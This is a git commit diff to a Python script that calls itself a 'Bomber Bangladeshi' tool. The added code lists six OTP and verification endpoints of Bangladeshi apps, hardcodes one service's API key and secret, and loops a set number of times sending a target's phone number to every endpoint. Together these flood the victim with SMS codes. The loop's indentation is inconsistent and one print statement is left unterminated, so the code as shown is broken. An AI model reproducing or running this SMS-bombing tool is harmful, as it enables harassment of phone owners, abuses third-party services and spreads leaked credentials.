4c5384be4dd4ba2003e1cb2e7244f70d033d233c
jamiul957 <73727571+jamiul957@users.noreply.github.com>
2022-01-04 11:51:34 +0600

    Update j4m1u9.py

--- j4m1u9.py
+++ j4m1u9.py
@@ -97,3 +97,46 @@ headers1 = CaseInsensitiveDict()
 headers1["Content-Type"] = "application/x-www-form-urlencoded"
 
 data1 = "phone="+number
+
+
+
+url2 = "https://api.daktarbhai.com/api/v2/otp/generate?=&api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88"+number+"&platform=app&activity=login"
+
+headers2 = CaseInsensitiveDict()
+headers2["Content-Type"] = "application/json"
+headers2["Content-Length"] = "0"
+
+
+url3 = "https://stage.bioscopelive.com/en/login/send-otp?phone=88"+number+"&operator=bd-otp"
+
+url4 = "https://xrides.shohoz.com/api/v2/user/send-mobile-verification-code"
+
+headers4 = CaseInsensitiveDict()
+headers4["Content-Type"] = "application/json"
+
+data4 = '{\"mobile\":\"'+number+'\"}'
+
+url5 = "https://addabaji.mobi/twocups-v1-robi/otp.php"
+
+headers5 = CaseInsensitiveDict()
+headers5["Content-Type"] = "application/x-www-form-urlencoded"
+
+data5 = "msisdn="+number
+
+url6 = "https://developer.quizgiri.xyz/api/v2.0/send-otp"
+headers6 = CaseInsensitiveDict()
+headers6["Content-Type"] = "application/json"
+
+data6 = '{"phone":"'+number+'","country_code":"+880","fcm_token":null}'
+
+for i in range (amount):
+  	resp1 = requests.post(url1, headers=headers1, data=data1)
+    	resp2 = requests.post(url2, headers=headers2)
+      resp3 = requests.get(url3)
+      resp4 = requests.post(url4, headers=headers4,data=data4)
+      resp5 = requests.post(url5, headers=headers5, data=data5)
+      resp = requests.post(url6, headers=headers6, data=data6)
+      print(str(i+1)+green+'.	➙J4M1U9 SENT 💔✅')
+      
+      print('
+     print(cyan+'\t\tThanks For Using Bomber Bangladeshi JAMIUL ISLAM- ')       
